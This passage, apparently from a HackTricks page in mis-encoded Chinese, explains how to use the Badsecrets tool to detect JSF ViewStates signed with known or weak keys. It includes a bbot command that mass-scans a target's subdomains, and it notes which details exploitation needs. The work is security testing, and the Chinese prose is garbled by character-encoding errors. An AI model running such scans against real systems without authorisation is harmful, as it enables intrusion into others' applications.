![Badsecrets](https://github.com/blacklanternsecurity/badsecrets) æ˜¯ä¸€ä¸ªåº“ï¼Œèƒ½å¤Ÿé€šè¿‡æŸ¥çœ‹å¯†é’¥ç”Ÿæˆçš„äº§å“ï¼Œå¹¶ä¸å·²çŸ¥æˆ–å¼±å¯†é’¥åˆ—è¡¨è¿›è¡Œæ¯”å¯¹ï¼Œæ¥æ£€æµ‹å·²çŸ¥åŠ å¯†å¯†é’¥çš„ä½¿ç”¨æƒ…å†µã€‚å…¶`Jsf_viewstate`æ¨¡å—èƒ½å¤Ÿæ£€æµ‹ä½¿ç”¨å·²çŸ¥å¯†é’¥åˆ›å»ºçš„Java Server Faces ViewStatesï¼Œæ— è®ºæ˜¯åœ¨Mojarraè¿˜æ˜¯MyFacesä¸Šï¼Œè¿˜èƒ½æ£€æµ‹æœªå—ä¿æŠ¤æˆ–å‹ç¼©çš„ViewStatesã€‚

ä½¿ç”¨`cli.py`ç¤ºä¾‹å·¥å…·æ˜¯æœ€å¿«æ·çš„æ–¹æ³•ï¼Œå…·ä½“æ“ä½œå¦‚ä¸‹ï¼š
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/cli.py Ly8gp+FZKt9XsaxT5gZu41DDxO74k029z88gNBOru2jXW0g1Og+RUPdf2d8hGNTiofkD1VvmQTZAfeV+5qijOoD+SPzw6K72Y1H0sxfx5mFcfFtmqX7iN6Gq0fwLM+9PKQz88f+e7KImJqG1cz5KYhcrgT87c5Ayl03wEHvWwktTq9TcBJc4f1VnNHXVZgALGqQuETU8hYwZ1VilDmQ7J4pZbv+pvPUvzk+/e2oNeybso6TXqUrbT2Mz3k7yfe92q3pRjdxRlGxmkO9bPqNOtETlLPE5dDiZYo1U9gr8BBQ=
```
![](https://user-images.githubusercontent.com/24899338/227623883-f760570d-796e-459d-87b0-b87ad33999ae.png)

å¦‚æœæ‰¾åˆ°åŒ¹é…é¡¹ï¼Œå®ƒè¿˜ä¼šåˆ—å‡ºå¹³å°ï¼ˆMojarraæˆ–MyFacesï¼‰ã€ä½¿ç”¨çš„åŠ å¯†ç®—æ³•ä»¥åŠæ˜¯å¦ä½¿ç”¨äº†å‹ç¼©ï¼Œè¿™äº›éƒ½æ˜¯åˆ©ç”¨æ‰€å¿…éœ€çš„ã€‚

ä¸ºäº†åœ¨è§„æ¨¡ä¸Šæœç´¢æ˜“å—æ”»å‡»çš„è§†å›¾çŠ¶æ€ï¼Œå¯ä»¥ä¸å­åŸŸæšä¸¾ä¸€èµ·ä½¿ç”¨`badsecrets` [**BBOT**]()æ¨¡å—ï¼š
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![](https://user-images.githubusercontent.com/24899338/227626488-e45e99b2-0f6d-451e-8a43-7d6db75098de.png)


# æ€»ç»“

æœ¬åšå®¢æ–‡ç« ä¸­ä»‹ç»çš„å…³äºJSF ViewStatesåŠå…¶å±é™©æ€§çš„å¤§éƒ¨åˆ†äº‹å®å¹¶ä¸æ˜¯æ–°çš„ï¼Œä½†ä¼¼ä¹ä»æœªä»¥å¦‚æ­¤ç®€æ˜çš„æ–¹å¼å‘ˆç°è¿‡ã€‚å®ƒå†æ¬¡è¡¨æ˜ï¼Œçœ‹ä¼¼æ— å®³çš„é…ç½®æ›´æ”¹å¯èƒ½å¯¼è‡´ä¸¥é‡çš„æ¼æ´ã€‚

\=> é—®é¢˜ä¹‹ä¸€ä¼¼ä¹æ˜¯å®‰å…¨ç ”ç©¶äººå‘˜ä¸å®é™…ä½¿ç”¨å’Œé…ç½®å¯èƒ½åœ¨æŸäº›æ–¹å¼ä¸‹å±é™©çš„åº“çš„å¼€å‘äººå‘˜ä¹‹é—´çš„çŸ¥è¯†è½¬ç§»ä¸è¶³ã€‚

# å‚è€ƒèµ„æ–™

* [https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
* [https://0xrick.github.io/hack-the-box/arkham/](https://0xrick.github.io/hack-the-box/arkham/)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
